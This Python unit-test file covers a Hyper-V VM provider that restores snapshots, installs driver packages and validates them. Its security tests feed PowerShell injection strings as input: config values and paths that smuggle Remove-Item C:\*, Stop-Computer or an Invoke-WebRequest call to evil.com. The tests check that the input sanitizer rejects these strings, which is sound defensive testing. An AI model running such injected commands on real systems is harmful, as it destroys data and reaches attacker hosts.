"""Unit tests for HyperVProvider"""

import unittest
import subprocess
from unittest.mock import Mock, patch, MagicMock, call
from pathlib import Path

from autopackager.agents.testing.vm_providers.hyperv_provider import HyperVProvider
from autopackager.models.package import Package


class TestHyperVProvider(unittest.TestCase):
    """Test cases for HyperVProvider"""

    def setUp(self):
        """Set up test fixtures"""
        self.config = {
            'vm_name': 'TestVM',
            'snapshot_name': 'clean_snapshot',
            'switch_name': 'Default Switch',
            'boot_timeout_seconds': 300,
            'timeout_minutes': 30
        }
        self.provider = HyperVProvider(self.config)
        self.package = Mock(spec=Package)
        self.package.id = 1
        self.package.name = 'Test Driver'
        self.package.intunewin_path = '/test/package.intunewin'
        self.package.install_command = 'installer.exe /S'
        self.package.detection_rules = []

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_provision_vm_success(self, mock_run):
        """Test successful VM provisioning"""
        # Mock all PowerShell commands to succeed
        mock_run.return_value = Mock(returncode=0, stdout='OkApplicationsHealthy\n', stderr='')

        result = self.provider.provision_vm()

        # Verify result
        self.assertTrue(result['success'])
        self.assertEqual(result['vm_id'], 'TestVM')
        self.assertIsNone(result['error'])

        # Verify PowerShell commands were called
        self.assertGreater(mock_run.call_count, 0)

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_provision_vm_restore_snapshot_failure(self, mock_run):
        """Test VM provisioning when snapshot restore fails"""
        # Mock restore snapshot to fail
        mock_run.return_value = Mock(returncode=1, stdout='', stderr='Snapshot not found')

        result = self.provider.provision_vm()

        # Verify result
        self.assertFalse(result['success'])
        self.assertIn('Failed to restore VM snapshot', result['error'])

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_provision_vm_start_failure(self, mock_run):
        """Test VM provisioning when VM start fails"""
        # Mock restore to succeed, start to fail
        def mock_subprocess_run(cmd, **kwargs):
            if 'Restore-VMSnapshot' in cmd[2]:
                return Mock(returncode=0, stdout='', stderr='')
            elif 'Start-VM' in cmd[2]:
                return Mock(returncode=1, stdout='', stderr='Failed to start')
            return Mock(returncode=0, stdout='', stderr='')

        mock_run.side_effect = mock_subprocess_run

        result = self.provider.provision_vm()

        # Verify result
        self.assertFalse(result['success'])
        self.assertIn('Failed to start VM', result['error'])

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.time.sleep')
    def test_provision_vm_boot_timeout(self, mock_sleep, mock_run):
        """Test VM provisioning when boot times out"""
        # Mock restore and start to succeed, but heartbeat never becomes healthy
        def mock_subprocess_run(cmd, **kwargs):
            if 'Restore-VMSnapshot' in cmd[2]:
                return Mock(returncode=0, stdout='', stderr='')
            elif 'Start-VM' in cmd[2]:
                return Mock(returncode=0, stdout='', stderr='')
            elif 'Heartbeat' in cmd[2]:
                return Mock(returncode=0, stdout='NotResponding\n', stderr='')
            return Mock(returncode=0, stdout='', stderr='')

        mock_run.side_effect = mock_subprocess_run

        # Reduce boot timeout for faster test
        self.provider.boot_timeout = 1

        result = self.provider.provision_vm()

        # Verify result
        self.assertFalse(result['success'])
        self.assertIn('VM boot timeout or failed', result['error'])

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_install_package_success(self, mock_run):
        """Test successful package installation"""
        # Mock PowerShell commands to succeed
        mock_run.return_value = Mock(returncode=0, stdout='Installation complete', stderr='')

        # Mock package path to exist
        with patch('autopackager.agents.testing.vm_providers.hyperv_provider.Path') as mock_path:
            mock_package_path = MagicMock()
            mock_package_path.exists.return_value = True
            mock_package_path.parent.glob.side_effect = [
                [Path('/test/installer.exe')],  # .exe files
                []  # .msi files
            ]
            mock_path.return_value = mock_package_path

            result = self.provider.install_package(self.package)

        # Verify result
        self.assertTrue(result['success'])
        self.assertEqual(result['exit_code'], 0)
        self.assertIsNone(result['error'])

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_install_package_file_not_found(self, mock_run):
        """Test package installation when package file doesn't exist"""
        # Mock package path to not exist
        with patch('autopackager.agents.testing.vm_providers.hyperv_provider.Path') as mock_path:
            mock_package_path = MagicMock()
            mock_package_path.exists.return_value = False
            mock_path.return_value = mock_package_path

            result = self.provider.install_package(self.package)

        # Verify result
        self.assertFalse(result['success'])
        self.assertIn('Package file not found', result['error'])

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_install_package_no_installer_found(self, mock_run):
        """Test package installation when no installer file found"""
        # Mock package path to exist but no installers
        with patch('autopackager.agents.testing.vm_providers.hyperv_provider.Path') as mock_path:
            mock_package_path = MagicMock()
            mock_package_path.exists.return_value = True
            mock_package_path.parent.glob.return_value = []  # No installers
            mock_path.return_value = mock_package_path

            result = self.provider.install_package(self.package)

        # Verify result
        self.assertFalse(result['success'])
        self.assertIn('No installer file found', result['error'])

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_install_package_command_failure(self, mock_run):
        """Test package installation when install command fails"""
        # Mock copy to succeed, install to fail
        def mock_subprocess_run(cmd, **kwargs):
            if 'Copy-VMFile' in cmd[2]:
                return Mock(returncode=0, stdout='', stderr='')
            elif 'Invoke-Command' in cmd[2]:
                return Mock(returncode=1, stdout='', stderr='Installation failed')
            return Mock(returncode=0, stdout='', stderr='')

        mock_run.side_effect = mock_subprocess_run

        # Mock package path
        with patch('autopackager.agents.testing.vm_providers.hyperv_provider.Path') as mock_path:
            mock_package_path = MagicMock()
            mock_package_path.exists.return_value = True
            mock_package_path.parent.glob.side_effect = [
                [Path('/test/installer.exe')],
                []
            ]
            mock_path.return_value = mock_package_path

            result = self.provider.install_package(self.package)

        # Verify result
        self.assertFalse(result['success'])
        self.assertIn('Install command failed', result['error'])

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_validate_installation_all_checks_pass(self, mock_run):
        """Test validation when all checks pass"""
        # Mock all validation commands to succeed with no errors
        def mock_subprocess_run(cmd, **kwargs):
            if 'Get-PnpDevice' in cmd[2]:
                return Mock(returncode=0, stdout='[]\n', stderr='')
            elif 'Get-WinEvent' in cmd[2]:
                return Mock(returncode=0, stdout='[]\n', stderr='')
            elif 'Get-Process' in cmd[2]:
                return Mock(returncode=0, stdout='System\n', stderr='')
            return Mock(returncode=0, stdout='', stderr='')

        mock_run.side_effect = mock_subprocess_run

        result = self.provider.validate_installation(self.package)

        # Verify result
        self.assertTrue(result['success'])
        self.assertEqual(result['device_status'], 'OK')
        self.assertEqual(len(result['event_log_errors']), 0)
        self.assertIsNone(result['error'])

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_validate_installation_detects_device_errors(self, mock_run):
        """Test validation detects Device Manager errors"""
        # Mock device check to return errors
        def mock_subprocess_run(cmd, **kwargs):
            if 'Get-PnpDevice' in cmd[2]:
                return Mock(
                    returncode=0,
                    stdout='[{"FriendlyName":"Test Device","Status":"Error","InstanceId":"123"}]\n',
                    stderr=''
                )
            elif 'Get-WinEvent' in cmd[2]:
                return Mock(returncode=0, stdout='[]\n', stderr='')
            elif 'Get-Process' in cmd[2]:
                return Mock(returncode=0, stdout='System\n', stderr='')
            return Mock(returncode=0, stdout='', stderr='')

        mock_run.side_effect = mock_subprocess_run

        result = self.provider.validate_installation(self.package)

        # Verify result
        self.assertFalse(result['success'])
        self.assertEqual(result['device_status'], 'Errors found')
        self.assertIn('One or more validation checks failed', result['error'])

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_validate_installation_detects_event_log_errors(self, mock_run):
        """Test validation detects Event Log errors"""
        # Mock event log to return errors
        def mock_subprocess_run(cmd, **kwargs):
            if 'Get-PnpDevice' in cmd[2]:
                return Mock(returncode=0, stdout='[]\n', stderr='')
            elif 'Get-WinEvent' in cmd[2]:
                return Mock(
                    returncode=0,
                    stdout='[{"TimeCreated":"2026-03-20","Message":"Driver error"}]\n',
                    stderr=''
                )
            elif 'Get-Process' in cmd[2]:
                return Mock(returncode=0, stdout='System\n', stderr='')
            return Mock(returncode=0, stdout='', stderr='')

        mock_run.side_effect = mock_subprocess_run

        result = self.provider.validate_installation(self.package)

        # Verify result
        self.assertFalse(result['success'])
        self.assertGreater(len(result['event_log_errors']), 0)

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_cleanup_vm_success(self, mock_run):
        """Test successful VM cleanup"""
        mock_run.return_value = Mock(returncode=0, stdout='', stderr='')

        result = self.provider.cleanup_vm()

        # Verify result
        self.assertTrue(result['success'])
        self.assertIsNone(result['error'])

        # Verify Stop-VM command was called
        self.assertTrue(any('Stop-VM' in str(call) for call in mock_run.call_args_list))

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_cleanup_vm_failure(self, mock_run):
        """Test VM cleanup when stop fails"""
        mock_run.return_value = Mock(returncode=1, stdout='', stderr='Failed to stop')

        result = self.provider.cleanup_vm()

        # Verify result
        self.assertFalse(result['success'])
        self.assertIn('Failed to stop VM', result['error'])

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_copy_file_to_vm_success(self, mock_run):
        """Test successful file copy to VM"""
        mock_run.return_value = Mock(returncode=0, stdout='', stderr='')

        result = self.provider.copy_file_to_vm(Path('/test/file.txt'), 'C:\\dest\\file.txt')

        # Verify result
        self.assertTrue(result)

        # Verify Copy-VMFile command was called
        self.assertTrue(any('Copy-VMFile' in str(call) for call in mock_run.call_args_list))

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_execute_command_success(self, mock_run):
        """Test successful command execution in VM"""
        mock_run.return_value = Mock(returncode=0, stdout='Command output', stderr='')

        result = self.provider.execute_command('Get-Process')

        # Verify result
        self.assertTrue(result['success'])
        self.assertEqual(result['exit_code'], 0)
        self.assertEqual(result['stdout'], 'Command output')

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_execute_command_failure(self, mock_run):
        """Test command execution failure"""
        mock_run.return_value = Mock(returncode=1, stdout='', stderr='Command failed')

        result = self.provider.execute_command('Invalid-Command')

        # Verify result
        self.assertFalse(result['success'])
        self.assertEqual(result['exit_code'], 1)
        self.assertEqual(result['stderr'], 'Command failed')

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_run_powershell_command_timeout(self, mock_run):
        """Test PowerShell command timeout handling"""
        mock_run.side_effect = subprocess.TimeoutExpired('powershell', 30)

        result = self.provider._run_powershell_command('Start-Sleep -Seconds 100', timeout=1)

        # Verify timeout handling
        self.assertEqual(result['exit_code'], -1)
        self.assertIn('timeout', result['stderr'].lower())

    # Security Tests

    def test_rejects_malicious_vm_name(self):
        """Test that malicious VM names are rejected"""
        malicious_config = {
            'vm_name': 'TestVM"; Remove-Item C:\\*; "',
            'snapshot_name': 'clean',
            'switch_name': 'Default Switch'
        }
        with self.assertRaises(ValueError):
            HyperVProvider(malicious_config)

    def test_rejects_malicious_snapshot_name(self):
        """Test that malicious snapshot names are rejected"""
        malicious_config = {
            'vm_name': 'TestVM',
            'snapshot_name': 'clean"; Stop-Computer; "',
            'switch_name': 'Default Switch'
        }
        with self.assertRaises(ValueError):
            HyperVProvider(malicious_config)

    def test_rejects_malicious_switch_name(self):
        """Test that malicious switch names are rejected"""
        malicious_config = {
            'vm_name': 'TestVM',
            'snapshot_name': 'clean',
            'switch_name': 'Switch"; Invoke-WebRequest http://evil.com; "'
        }
        with self.assertRaises(ValueError):
            HyperVProvider(malicious_config)

    def test_rejects_malicious_paths(self):
        """Test that malicious file paths are rejected"""
        provider = HyperVProvider(self.config)
        malicious_path = 'C:\\test"; Remove-Item C:\\*; "'
        result = provider.copy_file_to_vm(Path('/source'), malicious_path)
        self.assertFalse(result)

    def test_accepts_valid_vm_name(self):
        """Test that valid VM names are accepted"""
        valid_config = {
            'vm_name': 'TestVM-Win10-x64',
            'snapshot_name': 'clean_snapshot',
            'switch_name': 'Default Switch'
        }
        # Should not raise
        provider = HyperVProvider(valid_config)
        self.assertEqual(provider.vm_name, 'TestVM-Win10-x64')

    def test_accepts_valid_paths(self):
        """Test that valid file paths are accepted"""
        provider = HyperVProvider(self.config)
        valid_source = Path('C:\\packages\\driver_v1.0\\installer.exe')
        valid_dest = 'C:\\Temp\\installer.exe'

        with patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout='', stderr='')
            result = provider.copy_file_to_vm(valid_source, valid_dest)
            self.assertTrue(result)

    def test_sanitize_powershell_param_allows_valid_names(self):
        """Test that _sanitize_powershell_param allows valid names"""
        provider = HyperVProvider(self.config)

        # Valid names should pass
        self.assertEqual(provider._sanitize_powershell_param('test', 'TestVM', False), 'TestVM')
        self.assertEqual(provider._sanitize_powershell_param('test', 'VM-Name_123', False), 'VM-Name_123')

    def test_sanitize_powershell_param_allows_valid_paths(self):
        """Test that _sanitize_powershell_param allows valid paths"""
        provider = HyperVProvider(self.config)

        # Valid paths should pass
        self.assertEqual(
            provider._sanitize_powershell_param('path', 'C:\\Test\\file.exe', True),
            'C:\\Test\\file.exe'
        )

    def test_sanitize_powershell_param_rejects_injection_attempts(self):
        """Test that _sanitize_powershell_param rejects injection attempts"""
        provider = HyperVProvider(self.config)

        # Malicious inputs should fail
        with self.assertRaises(ValueError):
            provider._sanitize_powershell_param('test', 'VM"; malicious', False)

        with self.assertRaises(ValueError):
            provider._sanitize_powershell_param('test', 'VM$(evil)', False)

        with self.assertRaises(ValueError):
            provider._sanitize_powershell_param('test', 'VM|evil', False)

    def test_sanitize_powershell_param_rejects_empty_values(self):
        """Test that _sanitize_powershell_param rejects empty values"""
        provider = HyperVProvider(self.config)

        with self.assertRaises(ValueError):
            provider._sanitize_powershell_param('test', '', False)

    @patch('autopackager.agents.testing.vm_providers.hyperv_provider.subprocess.run')
    def test_execute_command_warns_on_suspicious_characters(self, mock_run):
        """Test that execute_command logs warnings for suspicious characters"""
        mock_run.return_value = Mock(returncode=0, stdout='output', stderr='')

        provider = HyperVProvider(self.config)

        # Command with suspicious characters should still execute but log warning
        result = provider.execute_command('Get-Process | Where-Object {$_.Name -eq "test"}')

        # Should complete successfully
        self.assertTrue(result['success'])


if __name__ == '__main__':
    unittest.main()
